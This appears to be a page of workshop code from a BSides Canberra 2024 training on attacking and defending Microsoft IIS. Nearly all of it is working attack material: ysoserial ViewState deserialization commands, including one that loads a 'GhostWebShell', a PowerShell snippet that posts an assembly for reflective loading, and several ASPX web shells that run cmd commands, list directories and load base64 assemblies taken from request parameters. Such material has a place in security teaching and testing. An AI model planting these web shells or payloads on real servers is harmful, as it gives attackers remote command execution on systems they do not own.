Attacking and Defending Microsoft IIS - BSides Canberra 2024 Training Code
Published: 22/09/2024

<b>Slides</b>
[Available here](https://zeroed.tech/Attacking%20and%20Defending%20Microsoft%20IIS%20-%20Handout.pdf)

PowerShell Commands
<pre>
Reflectively load assembly via PowerShell
$asm = [Convert]::ToBase64String([IO.File]::ReadAllBytes("ASM PATH"))
$payload = @{asm=$asm; name="Name"}
Invoke-WebRequest -Uri http://127.0.0.1/reflection.aspx -Method POST -Body $payload | select -Expand Content
YSoSerial - Command Execution
.ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "COMMAND" --validationalg="VALIDATIONALGORITHM" --path="TARGETPATH" --apppath="APPLICATIONPATH" --validationkey="VALIDATIONKEY" --islegacy --isdebug
YSoSerial - Disabling Type Checking
.ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c "" --validationalg="VALIDATIONALGORITHM" --path="TARGETPATH"  --apppath="APPLICATIONPATH" --validationkey="VALIDATIONKEY" --islegacy --showraw
YSoSerial - Reflectively Loading .NET Assembly
.ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c ".payload.cs;System.dll;System.Web.dll" --validationalg="VALIDATIONALGORITHM" --path="TARGETPATH"  --apppath="APPLICATIONPATH" --validationkey="VALIDATIONKEY" --islegacy --showraw
YSoSerial - Ghostshell
.ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c ".GhostWebShell.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll" --validationalg="VALIDATIONALGORITHM" --path="TARGETPATH"  --apppath="APPLICATIONPATH" --validationkey="VALIDATIONKEY" --islegacy --showraw
</pre>
<pre>
CMD Shell
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    Process process = new Process();
    process.StartInfo.FileName = "cmd";
    process.StartInfo.Arguments = "/c whoami";
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.RedirectStandardError =true;
    process.Start();
    string output = process.StandardOutput.ReadToEnd();
    string error = process.StandardError.ReadToEnd();
    process.WaitForExit();
    Response.Write(output);
    Response.Write(error);
%>
</pre>
<pre>
CMD Shell - Parameters
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    Process process = new Process();
    process.StartInfo.FileName = "cmd";
    process.StartInfo.Arguments = "/c "+Request.Params["cmd"];
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.RedirectStandardError =true;
    process.Start();
    string output = process.StandardOutput.ReadToEnd();
    string error = process.StandardError.ReadToEnd();
    process.WaitForExit();
    
    Response.Write("<pre>");
    Response.Write(output);
    Response.Write(error);
    Response.Write("</pre>");
%>
</pre>
<pre>
CMD Shell - Pre-Formatting
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    Process process = new Process();
    process.StartInfo.FileName = "cmd";
    process.StartInfo.Arguments = "/c "+Request.Params["cmd"];
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.RedirectStandardError =true;
    process.Start();
    string output = process.StandardOutput.ReadToEnd();
    string error = process.StandardError.ReadToEnd();
    process.WaitForExit();
Response.Write("<pre>");
    Response.Write(output);
    Response.Write(error);
    Response.Write("</pre>");
%>
</pre>
<pre>
CMD Shell - Encoding
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    Process process = new Process();
    process.StartInfo.FileName = "cmd";
    process.StartInfo.Arguments = "/c "+Request.Params["cmd"];
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.RedirectStandardError =true;
    process.Start();
    string output = process.StandardOutput.ReadToEnd();
    string error = process.StandardError.ReadToEnd();
    process.WaitForExit();
Response.Write("<pre>");
    Response.Write(HttpUtility.HtmlEncode(output));
    Response.Write(HttpUtility.HtmlEncode(error));
    Response.Write("</pre>");
%>
<pre>
<pre>
All In One Shell - CMD
<%@ Page Language = "C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web" %>
<%
    var output = "";
    var error = "";
    switch (Request.Params["function"])
    {
        case "cmd":
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd";
            process.StartInfo.Arguments = "/c " + Request.Params["cmd"];
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
            
            output += process.StandardOutput.ReadToEnd();
            error += process.StandardError.ReadToEnd();
            process.WaitForExit();
            break;
        }
    }
Response.Write("<pre>");
    Response.Write(HttpUtility.HtmlEncode(output));
    Response.Write(HttpUtility.HtmlEncode(error));
Response.Write("</pre>");
%>
</pre>
<pre>
All In One Shell - Whoami
<%@ Page Language = "C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Security.Principal" %>
<%
    var output = "";
    var error = "";
    switch (Request.Params["function"])
    {
        case "cmd":{}
        case "whoami":{
            string userName = WindowsIdentity.GetCurrent().Name;
            string sid = WindowsIdentity.GetCurrent().Owner.ToString();
            output += "User: "+userName+"\nSID: "+sid;
            break;
        }
    }
Response.Write("<pre>");
    Response.Write(HttpUtility.HtmlEncode(output));
    Response.Write(HttpUtility.HtmlEncode(error));
Response.Write("</pre>");
%>
</pre>
<pre>
All In One Shell - Dir
<%@ Page Language = "C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.IO" %>
<%
    var output = "";
    var error = "";
    switch (Request.Params["function"])
    {
        case "cmd":{}
        case "whoami":{}
        case "dir":{
            StringBuilder sb = new StringBuilder();
            var targetPath = Request.Params["path"];
            var formatString = "{0,-25}\t{1,-20}\t{2,-20}\t{3,-20}\t{4}";
            sb.AppendLine(string.Format(formatString, "Name", "Last Access Time", "Last Write Time", "Creation Time", "Size"));
            sb.AppendLine("==================================================================================================================");
            foreach(var path in Directory.GetDirectories(targetPath))
            {
                var directory = new DirectoryInfo(path);
                sb.AppendLine(string.Format(formatString, directory.Name, directory.LastAccessTimeUtc, directory.LastWriteTimeUtc, directory.CreationTimeUtc, ""));
            }
    
            foreach (var path in Directory.GetFiles(targetPath))
            {
                var file = new FileInfo(path);
                sb.AppendLine(string.Format(formatString, file.Name, file.LastAccessTimeUtc, file.LastWriteTimeUtc, file.CreationTimeUtc, file.Length));
            }
            output += sb.ToString();
            break;
        }
    }
Response.Write("<pre>");
    Response.Write(HttpUtility.HtmlEncode(output));
    Response.Write(HttpUtility.HtmlEncode(error));
Response.Write("</pre>");
%>
</pre>
<pre>
.NET Reflection Webshell
<%@ Page Language="C#"%>
<%@ Import Namespace="System.Reflection" %>
<%
    var encodedAssembly = Convert.FromBase64String(Request.Params["asm"]);
    var asm = Assembly.Load(encodedAssembly);
    asm.CreateInstance("Payload");
    //Assembly.Load(Convert.FromBase64String(Request.Params["asm"])).CreateInstance("Payload");
%>
</pre>
<pre>
Payload - Hello
using System.Web;
public class Payload
{
    public Payload()
    {
        var Request = HttpContext.Current.Request;
        var Response = HttpContext.Current.Response;
        var param = Request.Params["name"];
        Response.Write($"Hello {param}");
    }
}
</pre>
<pre>
Payload - Dir
using System.Web;
public class Payload
{
    public Payload()
    {
        var Request = HttpContext.Current.Request;
        var Response = HttpContext.Current.Response;
StringBuilder sb = new StringBuilder();
        var targetPath = Request.Params["path"];
        var formatString = "{0,-25}\t{1,-20}\t{2,-20}\t{3,-20}\t{4}";
        sb.AppendLine(string.Format(formatString, "Name", "Last Access Time", "Last Write Time", "Creation Time", "Size"));
        sb.AppendLine("==================================================================================================================");
        foreach(var path in Directory.GetDirectories(targetPath))
        {
            var directory = new DirectoryInfo(path);
            sb.AppendLine(string.Format(formatString, directory.Name, directory.LastAccessTimeUtc, directory.LastWriteTimeUtc, directory.CreationTimeUtc, ""));
        }
foreach (var path in Directory.GetFiles(targetPath))
        {
            var file = new FileInfo(path);
            sb.AppendLine(string.Format(formatString, file.Name, file.LastAccessTimeUtc, file.LastWriteTimeUtc, file.CreationTimeUtc, file.Length));
        }
        Response.Write(sb.ToString());
    }
}
</pre>
